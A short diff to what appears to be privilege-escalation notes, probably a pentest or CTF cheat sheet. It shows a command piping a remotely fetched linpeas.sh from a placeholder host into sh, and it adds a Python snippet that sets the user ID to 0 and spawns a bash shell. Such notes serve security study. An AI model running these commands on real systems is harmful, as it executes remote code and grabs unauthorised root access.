@@ -175,4 +175,9 @@ Or get it localy and run it.
 
     curl -l http://your-address/linpeas.sh | sh
 
+![image](https://github.com/user-attachments/assets/7f6cffe7-c8c8-4f44-b84a-e6701aa460f9)
+
+    import os
+    os.setuid(0)
+    os.system("/bin/bash")
 
